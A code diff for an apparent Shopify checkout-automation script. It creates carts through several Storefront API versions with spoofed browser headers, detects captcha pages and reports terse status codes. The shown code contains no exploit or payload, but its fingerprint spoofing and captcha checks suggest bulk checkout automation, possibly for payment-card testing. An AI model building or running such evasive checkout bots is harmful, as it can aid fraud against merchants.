+                    'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
+                    'operationName': 'cartCreate',
+                    'variables': {
+                        'input': {
+                            'lines': [
+                                {
+                                    'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
+                                    'quantity': 1,
+                                    'attributes': [],
+                                },
+                            ],
+                            'discountCodes': [],
+                        },
+                        'country': 'US',
+                        'language': 'EN',
+                    },
+                }
+
+                # Try multiple Storefront API endpoints (different Shopify versions)
+                cart_endpoints = [
+                    f'{url}/api/unstable/graphql.json',
+                    f'{url}/api/2024-01/graphql.json',
+                    f'{url}/api/2023-10/graphql.json',
+                    f'{url}/api/2023-07/graphql.json',
+                    f'{url}/api/2023-04/graphql.json',
+                ]
+                response = None
+                last_cart_error = None
+                for cart_url in cart_endpoints:
+                    try:
+                        response = await session.post(cart_url, params=params, headers=headers, json=json_data, timeout=18, follow_redirects=True)
+                        if response and getattr(response, "status_code", 0) == 200:
+                            resp_text = (response.text or "").strip()
+                            if resp_text.startswith("{") and "checkoutUrl" in resp_text:
+                                break
+                        if response and getattr(response, "status_code", 0) == 404:
+                            continue
                     except Exception as e:
-                        logger.debug(f"Cart/add attempt {cart_attempt + 1} failed: {e}")
-                    if cart_attempt < 2:
-                        await asyncio.sleep(0.5 + cart_attempt * 0.3)
-                if not checkout_url:
+                        last_cart_error = str(e)[:80]
+                        continue
+                if not response or getattr(response, "status_code", 0) != 200:
                     output.update({
-                        "Response": "SITE_ACCESS_TOKEN_MISSING",
+                        "Response": f"CART_HTTP_ERROR: {(last_cart_error or 'all endpoints failed')[:50]}",
                         "Status": False,
                     })
                     _log_output_to_terminal(output)
                     return output
 
-        if site_key and str(site_key).strip():
-            headers = {
-                'accept': 'application/json',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/json',
-                'origin': url,
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': f'{mobile}',
-                'sec-ch-ua-platform': f'"{clienthint}"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': f'{getua}',
-                'x-sdk-variant': 'portable-wallets',
-                'x-shopify-storefront-access-token': site_key,
-                'x-start-wallet-checkout': 'true',
-                'x-wallet-name': 'MoreOptions'
-            }
-
-            params = {
-                'operation_name': 'cartCreate',
-            }
-
-            json_data = {
-            'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
-            'operationName': 'cartCreate',
-            'variables': {
-                'input': {
-                    'lines': [
-                        {
-                            'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
-                            'quantity': 1,
-                            'attributes': [],
-                        },
-                    ],
-                    'discountCodes': [],
-                },
-                'country': 'US',
-                'language': 'EN',
-            },
-            }
-
-            # Try multiple Storefront API endpoints (different Shopify versions)
-            cart_endpoints = [
-                f'{url}/api/unstable/graphql.json',
-                f'{url}/api/2024-01/graphql.json',
-                f'{url}/api/2023-10/graphql.json',
-                f'{url}/api/2023-07/graphql.json',
-                f'{url}/api/2023-04/graphql.json',
-            ]
-            response = None
-            last_cart_error = None
-            for cart_url in cart_endpoints:
+                # Parse cart creation response with error handling
                 try:
-                    response = await session.post(cart_url, params=params, headers=headers, json=json_data, timeout=18, follow_redirects=True)
-                    if response and getattr(response, "status_code", 0) == 200:
-                        resp_text = (response.text or "").strip()
-                        if resp_text.startswith("{") and "checkoutUrl" in resp_text:
-                            break
-                    if response and getattr(response, "status_code", 0) == 404:
-                        continue
-                except Exception as e:
-                    last_cart_error = str(e)[:80]
-                    continue
-            if not response or getattr(response, "status_code", 0) != 200:
-                output.update({
-                    "Response": f"CART_HTTP_ERROR: {(last_cart_error or 'all endpoints failed')[:50]}",
-                    "Status": False,
-                })
-                _log_output_to_terminal(output)
-                return output
-
-            # Parse cart creation response with error handling
-            try:
-                response_text = response.text if response.text else ""
-                if response_text.strip().startswith("<"):
-                    if any(x in response_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
-                        output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
+                    response_text = response.text if response.text else ""
+                    if response_text.strip().startswith("<"):
+                        if any(x in response_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
+                            output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
+                            _log_output_to_terminal(output)
+                            return output
+                        output.update({"Response": "CART_HTML_ERROR", "Status": False})
                         _log_output_to_terminal(output)
                         return output
-                    output.update({"Response": "CART_HTML_ERROR", "Status": False})
+                    if not hasattr(response, 'json'):
+                        output.update({"Response": "CART_NO_JSON_METHOD", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                    try:
+                        response_data = response.json()
+                        if not response_data and (response.text or "").strip().startswith("{"):
+                            response_data = json.loads(response.text)
+                    except (json.JSONDecodeError, TypeError, AttributeError) as e:
+                        output.update({"Response": f"CART_JSON_ERROR: {str(e)[:50]}", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                    if not response_data or not isinstance(response_data, dict):
+                        output.update({"Response": "CART_INVALID_DATA", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                    if "errors" in response_data and response_data.get("errors"):
+                        error_msg = response_data["errors"][0].get("message", "GRAPHQL_ERROR")
+                        output.update({"Response": f"CART_ERROR: {error_msg[:50]}", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                    checkout_url = _get_checkout_url_from_cart_response(response_data)
+                    if not checkout_url:
+                        output.update({"Response": "CART_NO_CHECKOUT_URL", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                    # Bulletproof: if checkout URL is on different host, session cookies won't carry cart; use same-origin
+                    try:
+                        store_netloc = (urlparse(url).netloc or "").lower().strip()
+                        checkout_netloc = (urlparse(checkout_url).netloc or "").lower().strip()
+                        if store_netloc and checkout_netloc and store_netloc != checkout_netloc:
+                            add_headers = {
+                                'User-Agent': getua,
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Origin': url,
+                                'Referer': url,
+                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            }
+                            add_resp = await session.post(
+                                f'{url}/cart/add',
+                                headers=add_headers,
+                                data={'id': product_id, 'quantity': 1},
+                                timeout=15,
+                                follow_redirects=True,
+                            )
+                            if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
+                                checkout_url = url.rstrip('/') + '/checkout'
+                                await asyncio.sleep(0.6)
+                                logger.info(f"Using same-origin checkout for {url} (external checkout URL)")
+                    except Exception:
+                        pass
+                except json.JSONDecodeError:
+                    output.update({"Response": "CART_INVALID_JSON", "Status": False})
                     _log_output_to_terminal(output)
                     return output
-                if not hasattr(response, 'json'):
-                    output.update({"Response": "CART_NO_JSON_METHOD", "Status": False})
+                except (KeyError, TypeError):
+                    output.update({"Response": "CART_CREATION_FAILED", "Status": False})
                     _log_output_to_terminal(output)
                     return output
-                try:
-                    response_data = response.json()
-                    if not response_data and (response.text or "").strip().startswith("{"):
-                        response_data = json.loads(response.text)
-                except (json.JSONDecodeError, TypeError, AttributeError) as e:
-                    output.update({"Response": f"CART_JSON_ERROR: {str(e)[:50]}", "Status": False})
-                    _log_output_to_terminal(output)
-                    return output
-                if not response_data or not isinstance(response_data, dict):
-                    output.update({"Response": "CART_INVALID_DATA", "Status": False})
-                    _log_output_to_terminal(output)
-                    return output
-                if "errors" in response_data and response_data.get("errors"):
-                    error_msg = response_data["errors"][0].get("message", "GRAPHQL_ERROR")
-                    output.update({"Response": f"CART_ERROR: {error_msg[:50]}", "Status": False})
-                    _log_output_to_terminal(output)
-                    return output
-                checkout_url = _get_checkout_url_from_cart_response(response_data)
-                if not checkout_url:
-                    output.update({"Response": "CART_NO_CHECKOUT_URL", "Status": False})
-                    _log_output_to_terminal(output)
-                    return output
-                # Bulletproof: if checkout URL is on different host, session cookies won't carry cart; use same-origin
-                try:
-                    store_netloc = (urlparse(url).netloc or "").lower().strip()
-                    checkout_netloc = (urlparse(checkout_url).netloc or "").lower().strip()
-                    if store_netloc and checkout_netloc and store_netloc != checkout_netloc:
-                        add_headers = {
-                            'User-Agent': getua,
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'Origin': url,
-                            'Referer': url,
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                        }
-                        add_resp = await session.post(
-                            f'{url}/cart/add',
-                            headers=add_headers,
-                            data={'id': product_id, 'quantity': 1},
-                            timeout=15,
-                            follow_redirects=True,
-                        )
-                        if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
-                            checkout_url = url.rstrip('/') + '/checkout'
-                            await asyncio.sleep(0.6)
-                            logger.info(f"Using same-origin checkout for {url} (external checkout URL)")
-                except Exception:
-                    pass
-            except json.JSONDecodeError:
-                output.update({"Response": "CART_INVALID_JSON", "Status": False})
-                _log_output_to_terminal(output)
-                return output
-            except (KeyError, TypeError):
-                output.update({"Response": "CART_CREATION_FAILED", "Status": False})
-                _log_output_to_terminal(output)
-                return output
 
         await asyncio.sleep(0.35)
         headers = {
